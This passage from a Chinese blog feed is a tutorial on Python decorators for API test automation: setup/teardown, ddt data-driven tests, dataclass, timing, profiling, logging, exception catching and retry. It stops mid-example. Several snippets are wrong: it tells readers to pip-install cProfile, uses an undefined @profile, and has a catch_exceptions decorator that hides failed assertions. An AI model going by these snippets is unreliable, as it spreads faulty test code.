      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【python】之装饰器的基础实现和常见装饰器</title>
    <link href="/2024/03/05/695python%E8%A3%85%E9%A5%B0%E5%99%A8/"/>
    <url>/2024/03/05/695python%E8%A3%85%E9%A5%B0%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><h1 id="实现方式"><a href="#实现方式" class="headerlink" title="实现方式"></a>实现方式</h1><h1 id="应用场景及常见装饰器"><a href="#应用场景及常见装饰器" class="headerlink" title="应用场景及常见装饰器"></a>应用场景及常见装饰器</h1><ul><li>在Python接口自动化测试中，装饰器可以用于增强测试函数的功能或改变其行为。以下是一些可能使用的装饰器示例：</li></ul><h2 id="设置和清理环境【setup和teardown】"><a href="#设置和清理环境【setup和teardown】" class="headerlink" title="设置和清理环境【setup和teardown】"></a><strong>设置和清理环境</strong>【setup和teardown】</h2><h3 id="setup：用于在测试开始前初始化环境或配置。"><a href="#setup：用于在测试开始前初始化环境或配置。" class="headerlink" title="@setup：用于在测试开始前初始化环境或配置。"></a>@setup：用于在测试开始前初始化环境或配置。</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">CustomTestRunner</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        self.setup_done = <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">setup</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Setting up environment...&quot;</span>)<br>        <span class="hljs-comment"># 初始化环境或配置的代码...</span><br>        self.setup_done = <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">teardown</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">if</span> self.setup_done:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Tearing down environment...&quot;</span>)<br>            <span class="hljs-comment"># 清理环境或资源的代码...</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">setup</span>(<span class="hljs-params">func</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">wrapper</span>(<span class="hljs-params">test_runner, *args, **kwargs</span>):<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> test_runner.setup_done:<br>            test_runner.setup()<br>        <span class="hljs-keyword">return</span> func(test_runner, *args, **kwargs)<br>    <span class="hljs-keyword">return</span> wrapper<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyTestCase</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        self.test_runner = CustomTestRunner()<br><span class="hljs-meta">    @setup</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">test_my_api</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">assert</span> self.test_runner.setup_done, <span class="hljs-string">&quot;Setup should have been called&quot;</span><br>        <span class="hljs-comment"># 实现你的接口测试代码...</span><br><span class="hljs-comment"># 使用示例</span><br>test_case = MyTestCase()<br>test_case.test_my_api()<br></code></pre></td></tr></table></figure><ul><li><p>在这个例子中，我们创建了一个名为CustomTestRunner的类，其中包含了一个setup方法用于初始化环境或配置。我们还定义了一个名为setup的装饰器，它会在调用被装饰的测试函数之前检查是否已经完成了设置，并在必要时调用setup方法。</p><p>在MyTestCase类中，我们使用@setup装饰器装饰了test_my_api方法。当我们创建一个MyTestCase实例并调用其test_my_api方法时，装饰器会确保在测试开始前调用了setup方法。</p><p>请注意，这个示例使用了一个自定义的测试运行器类（CustomTestRunner）和装饰器（@setup）。在实际项目中，你可能需要根据所使用的测试框架（如unittest、pytest等）来调整实现方式。例如，在unittest框架中，可以使用setUp和tearDown方法代替自定义的setup和teardown方法。</p></li></ul><h3 id="teardown：用于在测试结束后清理环境或资源。"><a href="#teardown：用于在测试结束后清理环境或资源。" class="headerlink" title="teardown：用于在测试结束后清理环境或资源。"></a>teardown：用于在测试结束后清理环境或资源。</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">CustomTestRunner</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        self.setup_done = <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">setup</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Setting up environment...&quot;</span>)<br>        <span class="hljs-comment"># 初始化环境或配置的代码...</span><br>        self.setup_done = <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">teardown</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">if</span> self.setup_done:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Tearing down environment...&quot;</span>)<br>            <span class="hljs-comment"># 清理环境或资源的代码...</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">teardown</span>(<span class="hljs-params">func</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">wrapper</span>(<span class="hljs-params">test_runner, *args, **kwargs</span>):<br>        result = func(test_runner, *args, **kwargs)<br>        test_runner.teardown()<br>        <span class="hljs-keyword">return</span> result<br>    <span class="hljs-keyword">return</span> wrapper<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyTestCase</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        self.test_runner = CustomTestRunner()<br><span class="hljs-meta">    @teardown</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">test_my_api</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">assert</span> self.test_runner.setup_done, <span class="hljs-string">&quot;Setup should have been called&quot;</span><br>        <span class="hljs-comment"># 实现你的接口测试代码...</span><br><span class="hljs-comment"># 使用示例</span><br>test_case = MyTestCase()<br>test_case.test_my_api()<br></code></pre></td></tr></table></figure><ul><li><p>在这个例子中，我们创建了一个名为CustomTestRunner的类，其中包含了一个teardown方法用于清理环境或资源。我们还定义了一个名为teardown的装饰器，它会在被装饰的测试函数执行完毕后调用teardown方法。</p><p>在MyTestCase类中，我们使用@teardown装饰器装饰了test_my_api方法。当我们创建一个MyTestCase实例并调用其test_my_api方法时，装饰器会确保在测试结束后调用了teardown方法。</p><p>请注意，这个示例使用了一个自定义的测试运行器类（CustomTestRunner）和装饰器（@teardown）。在实际项目中，你可能需要根据所使用的测试框架（如unittest、pytest等）来调整实现方式。例如，在unittest框架中，可以使用setUp和tearDown方法代替自定义的setup和teardown方法。在pytest框架中，可以使用yield语句和fixture功能来实现类似的效果。</p></li></ul><h2 id="数据驱动测试"><a href="#数据驱动测试" class="headerlink" title="数据驱动测试"></a>数据驱动测试</h2><p>使用ddt库提供的装饰器，如@data、@unpack等，来实现数据驱动的测试。</p><p>@data和@unpack是ddt（Data-Driven Tests）库提供的装饰器，用于实现数据驱动的测试。以下是一个使用@data和@unpack装饰器的示例：</p><ul><li><p>首先，确保已经安装了ddt库：pip install ddt</p></li><li><p>然后，可以使用以下代码示例：</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">from</span> ddt <span class="hljs-keyword">import</span> ddt, data, unpack<br><span class="hljs-keyword">import</span> unittest<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyTestCase</span>(unittest.TestCase):<br><span class="hljs-meta">    @classmethod</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">setUpClass</span>(<span class="hljs-params">cls</span>):<br>        cls.base_url = <span class="hljs-string">&quot;http://example.com/api&quot;</span><br><span class="hljs-meta">    @data(<span class="hljs-params"></span></span><br><span class="hljs-params"><span class="hljs-meta">        (<span class="hljs-params"><span class="hljs-string">&quot;Alice&quot;</span>, <span class="hljs-string">&quot;password123&quot;</span>, <span class="hljs-number">200</span></span>),</span></span><br><span class="hljs-params"><span class="hljs-meta">        (<span class="hljs-params"><span class="hljs-string">&quot;Bob&quot;</span>, <span class="hljs-string">&quot;invalid_password&quot;</span>, <span class="hljs-number">401</span></span>),</span></span><br><span class="hljs-params"><span class="hljs-meta">        (<span class="hljs-params"><span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-number">400</span></span>),</span></span><br><span class="hljs-params"><span class="hljs-meta">        (<span class="hljs-params"><span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>, <span class="hljs-number">400</span></span>),</span></span><br><span class="hljs-params"><span class="hljs-meta">    </span>)</span><br><span class="hljs-meta">    @unpack</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">test_login</span>(<span class="hljs-params">self, username, password, expected_status_code</span>):<br>        url = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;self.base_url&#125;</span>/login&quot;</span><br>        payload = &#123;<span class="hljs-string">&quot;username&quot;</span>: username, <span class="hljs-string">&quot;password&quot;</span>: password&#125;<br>        response = requests.post(url, json=payload)<br>        self.assertEqual(response.status_code, expected_status_code)<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    unittest.main()<br></code></pre></td></tr></table></figure><ul><li><p>在这个例子中：</p><p>我们使用@data装饰器定义了一个包含多个测试数据集的元组列表。每个元组代表一个特定的测试场景，包括用户名、密码和预期的HTTP状态码。</p><p>使用@unpack装饰器，我们可以将元组中的值直接解包并作为测试函数的参数。这样在测试函数内部，我们就可以直接使用这些变量名，而不需要通过索引来访问它们。</p><p>在test_login方法中，我们根据提供的用户名、密码和预期状态码发送登录请求，并验证响应的状态码是否与预期相符。</p><p>通过这种方式，我们可以使用@data和@unpack装饰器轻松地为同一个测试函数定义多个不同的测试场景，从而提高测试覆盖率和代码的可读性。</p></li></ul><h2 id="数据类装饰器，-dataclass"><a href="#数据类装饰器，-dataclass" class="headerlink" title="数据类装饰器，@dataclass"></a>数据类装饰器，@dataclass</h2><p>把一个类装饰成一个数据类–方便后面取值，后面就可以直接调用此类的属性拿到值了，不需要像字典一样使用点get()或者[‘键名’]的方式去拿数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> dataclasses <span class="hljs-keyword">import</span> dataclass<br><br><span class="hljs-meta">@dataclass</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>:<span class="hljs-comment"># 将这个类装饰成数据类</span><br>    name: <span class="hljs-built_in">str</span><span class="hljs-comment"># 定义数据的类型</span><br>    age: <span class="hljs-built_in">int</span><br>    email: <span class="hljs-built_in">str</span><br><br><span class="hljs-comment"># 创建对象 实例化对象，也就是实例化数据，</span><br>person = Person(<span class="hljs-string">&quot;Alice&quot;</span>, <span class="hljs-number">25</span>, <span class="hljs-string">&quot;alice@example.com&quot;</span>)<br><span class="hljs-built_in">print</span>(person.name)    <span class="hljs-comment"># 输出: Alice</span><br><span class="hljs-built_in">print</span>(person.age)     <span class="hljs-comment"># 输出: 25</span><br><span class="hljs-built_in">print</span>(person.email)   <span class="hljs-comment"># 输出: alice@example.com</span><br><span class="hljs-comment"># 也可以通过**的方式传进去，更美观</span><br>person2_dict = &#123;<br>    <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;Bob&quot;</span>,<br>    <span class="hljs-string">&quot;age&quot;</span>: <span class="hljs-number">30</span>,<br>    <span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&quot;Bob@example.com&quot;</span><br>&#125;<br>person2 = Person(**person2_dict)<br><span class="hljs-comment"># 访问属性</span><br><br><span class="hljs-built_in">print</span>(person2.name) <span class="hljs-comment"># 输出: Bob</span><br><span class="hljs-built_in">print</span>(person2.age)  <span class="hljs-comment"># 输出: 30</span><br><span class="hljs-built_in">print</span>(person2.email)  <span class="hljs-comment"># 输出: Bob@example.com</span><br><br></code></pre></td></tr></table></figure><h2 id="性能测试"><a href="#性能测试" class="headerlink" title="性能测试"></a>性能测试</h2><h3 id="timer：测量测试函数的执行时间。"><a href="#timer：测量测试函数的执行时间。" class="headerlink" title="@timer：测量测试函数的执行时间。"></a>@timer：测量测试函数的执行时间。</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">timer</span>(<span class="hljs-params">func</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">wrapper</span>(<span class="hljs-params">*args, **kwargs</span>):<br>        start_time = time.time() <span class="hljs-comment"># 记录开始时间</span><br>        result = func(*args, **kwargs)<br>        end_time = time.time()<span class="hljs-comment"># 记录结束时间</span><br>        <span class="hljs-comment"># 记录运行时间</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;func.__name__&#125;</span> executed in <span class="hljs-subst">&#123;end_time - start_time:<span class="hljs-number">.6</span>f&#125;</span> seconds&quot;</span>)<br>        <span class="hljs-keyword">return</span> result<br>    <span class="hljs-keyword">return</span> wrapper<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyTestCase</span>(unittest.TestCase):<br><span class="hljs-meta">    @timer</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">test_my_api</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-comment"># 实现你的接口测试代码...</span><br>        time.sleep(<span class="hljs-number">2</span>)  <span class="hljs-comment"># 模拟耗时操作</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    unittest.main()<br></code></pre></td></tr></table></figure><ul><li><p>在这个例子中：</p><p>我们定义了一个名为timer的装饰器，它接受一个函数作为参数，并返回一个新的函数（即wrapper）。</p><p>在wrapper函数内部，我们首先记录开始时间，然后调用原始函数并获取其结果，最后记录结束时间。</p><p>我们计算并打印出被装饰的函数的执行时间。</p><p>在MyTestCase类中，我们使用@timer装饰器装饰了test_my_api方法。当我们运行这个测试用例时，装饰器会测量并打印出该方法的执行时间。</p><p>请注意，这个timer装饰器只是一个简单的示例，实际使用中可能需要根据具体需求进行调整。例如，你可能希望将执行时间记录到日志文件中，或者在测试报告中包含执行时间信息等。</p></li></ul><h3 id="profile（使用cProfile库）：进行CPU性能分析。"><a href="#profile（使用cProfile库）：进行CPU性能分析。" class="headerlink" title="@profile（使用cProfile库）：进行CPU性能分析。"></a>@profile（使用cProfile库）：进行CPU性能分析。</h3><p>以下是一个使用@profile装饰器（配合cProfile库）进行CPU性能分析的简单示例：</p><ul><li><p>首先，确保已经安装了cProfile库 pip install cProfile</p></li><li><p>然后，可以使用以下代码示例：</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">import</span> cProfile<br><span class="hljs-keyword">from</span> pstats <span class="hljs-keyword">import</span> Stats<br><span class="hljs-keyword">import</span> unittest<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyTestCase</span>(unittest.TestCase):<br><span class="hljs-meta">    @classmethod</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">setUpClass</span>(<span class="hljs-params">cls</span>):<br>        cls.base_url = <span class="hljs-string">&quot;http://example.com/api&quot;</span><br><span class="hljs-meta">    @profile</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">test_my_api</span>(<span class="hljs-params">self</span>):<br>        url = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;self.base_url&#125;</span>/resource&quot;</span><br>        response = requests.get(url)<br>        self.assertEqual(response.status_code, <span class="hljs-number">200</span>)<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    profiler = cProfile.Profile()<br>    test_case = MyTestCase()<br>    test_case.test_my_api()<br>    profiler.create_stats()<br>    stats = Stats(profiler)<br>    stats.sort_stats(<span class="hljs-string">&#x27;cumulative&#x27;</span>)<br>    stats.print_stats()<br></code></pre></td></tr></table></figure><p>在这个例子中：</p><p>我们使用@profile装饰器装饰了test_my_api方法。当运行这个测试用例时，cProfile库会记录该方法的CPU性能数据。</p><p>在测试用例执行完毕后，我们创建了一个Stats对象，并将Profiler的统计数据传递给它。</p><p>我们调用sort_stats方法对统计数据进行排序。在这个例子中，我们选择了按累计时间排序。</p><p>最后，我们调用print_stats方法打印出性能分析结果。</p><p>请注意，这个示例只是一个基本的使用方式，实际使用中可能需要根据具体需求进行调整。例如，你可能希望将性能分析结果保存到文件中，或者使用更复杂的统计和过滤选项等。另外，cProfile库主要用于CPU性能分析，如果你需要进行内存或其他资源的性能分析，可能需要使用其他工具或库。</p><h2 id="日志记录"><a href="#日志记录" class="headerlink" title="日志记录"></a><strong>日志记录</strong></h2><h3 id="log-test：记录测试的开始和结束，以及测试结果。"><a href="#log-test：记录测试的开始和结束，以及测试结果。" class="headerlink" title="@log_test：记录测试的开始和结束，以及测试结果。"></a>@log_test：记录测试的开始和结束，以及测试结果。</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> unittest<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">TestLogger</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">log_start</span>(<span class="hljs-params">self, test_name</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Starting test: <span class="hljs-subst">&#123;test_name&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">log_end</span>(<span class="hljs-params">self, test_name, result</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Ending test: <span class="hljs-subst">&#123;test_name&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">if</span> result:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Test passed.&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Test failed.&quot;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">log_test</span>(<span class="hljs-params">func</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">wrapper</span>(<span class="hljs-params">test_logger, *args, **kwargs</span>):<br>        test_name = func.__name__<br>        test_logger.log_start(test_name)<br>        result = func(test_logger, *args, **kwargs)<br>        test_logger.log_end(test_name, result)<br>        <span class="hljs-keyword">return</span> result<br>    <span class="hljs-keyword">return</span> wrapper<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyTestCase</span>(unittest.TestCase):<br><span class="hljs-meta">    @classmethod</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">setUpClass</span>(<span class="hljs-params">cls</span>):<br>        cls.test_logger = TestLogger()<br><span class="hljs-meta">    @log_test</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">test_my_api</span>(<span class="hljs-params">self, test_logger</span>):<br>        url = <span class="hljs-string">&quot;http://example.com/api&quot;</span><br>        response = requests.get(url)<br>        self.assertEqual(response.status_code, <span class="hljs-number">200</span>)<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    unittest.main()<br></code></pre></td></tr></table></figure><ul><li><p>在这个例子中：</p><p>我们定义了一个名为TestLogger的类，它包含两个方法：log_start和log_end，分别用于记录测试的开始和结束，以及测试结果。</p><p>我们定义了一个名为log_test的装饰器，它接受一个函数作为参数，并返回一个新的函数（即wrapper）。</p><p>在wrapper函数内部，我们首先获取被装饰的函数名，然后调用log_start方法记录测试的开始。</p><p>我们调用原始函数并获取其结果。</p><p>我们调用log_end方法记录测试的结束，并传递测试结果。</p><p>在MyTestCase类中，我们创建了一个TestLogger实例，并在setUpClass方法中设置为类变量。</p><p>我们使用@log_test装饰器装饰了test_my_api方法。当我们运行这个测试用例时，装饰器会记录测试的开始和结束，以及测试结果。</p><p>请注意，这个log_test装饰器只是一个简单的示例，实际使用中可能需要根据具体需求进行调整。例如，你可能希望将日志信息写入文件，或者使用更复杂的日志格式和级别等。另外，这个示例中的日志输出是简单的文本形式，如果你需要更丰富的日志功能，可以考虑使用Python的logging模块。</p></li></ul><h2 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a><strong>异常处理</strong></h2><h3 id="catch-exceptions：捕获并处理测试函数中可能抛出的异常。"><a href="#catch-exceptions：捕获并处理测试函数中可能抛出的异常。" class="headerlink" title="@catch_exceptions：捕获并处理测试函数中可能抛出的异常。"></a>@catch_exceptions：捕获并处理测试函数中可能抛出的异常。</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> unittest<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">catch_exceptions</span>(<span class="hljs-params">func</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">wrapper</span>(<span class="hljs-params">*args, **kwargs</span>):<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">return</span> func(*args, **kwargs)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Exception caught during test: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> wrapper<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyTestCase</span>(unittest.TestCase):<br><span class="hljs-meta">    @classmethod</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">setUpClass</span>(<span class="hljs-params">cls</span>):<br>        cls.base_url = <span class="hljs-string">&quot;http://example.com/api&quot;</span><br><span class="hljs-meta">    @catch_exceptions</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">test_my_api</span>(<span class="hljs-params">self</span>):<br>        url = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;self.base_url&#125;</span>/resource&quot;</span><br>        response = requests.get(url)<br>        self.assertEqual(response.status_code, <span class="hljs-number">200</span>)<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    unittest.main()<br></code></pre></td></tr></table></figure><ul><li><p>在这个例子中：</p><p>我们定义了一个名为catch_exceptions的装饰器，它接受一个函数作为参数，并返回一个新的函数（即wrapper）。</p><p>在wrapper函数内部，我们使用try-except语句包裹原始函数的调用。如果在执行原始函数时抛出了异常，我们将捕获这个异常，并打印出异常信息。</p><p>如果捕获到异常，我们返回False，表示测试失败。否则，我们返回原始函数的返回值。</p><p>在MyTestCase类中，我们使用@catch_exceptions装饰器装饰了test_my_api方法。当我们运行这个测试用例时，装饰器会捕获并处理该方法中可能抛出的异常。</p><p>请注意，这个catch_exceptions装饰器只是一个简单的示例，实际使用中可能需要根据具体需求进行调整。例如，你可能希望对不同类型的异常进行不同的处理，或者在捕获异常后执行一些清理操作等。另外，虽然这个装饰器可以帮助我们在测试函数中捕获和处理异常，但在编写测试代码时，通常建议明确预期可能会抛出的异常，并使用assertRaises等断言来验证它们。这样可以提供更清晰的测试意图和更好的错误消息。</p></li></ul><h2 id="重试机制"><a href="#重试机制" class="headerlink" title="重试机制"></a>重试机制</h2><h3 id="retry：在测试失败时自动重试指定次数"><a href="#retry：在测试失败时自动重试指定次数" class="headerlink" title="@retry：在测试失败时自动重试指定次数"></a>@retry：在测试失败时自动重试指定次数</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">import</span> unittest<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">retry</span>(<span class="hljs-params">attempts=<span class="hljs-number">3</span>, delay=<span class="hljs-number">1</span></span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">decorator</span>(<span class="hljs-params">func</span>):<br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">wrapper</span>(<span class="hljs-params">*args, **kwargs</span>):<br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(attempts):<br>                <span class="hljs-keyword">try</span>:<br>                    <span class="hljs-keyword">return</span> func(*args, **kwargs)<br>                <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Test failed on attempt <span class="hljs-subst">&#123;i + <span class="hljs-number">1</span>&#125;</span>: <span 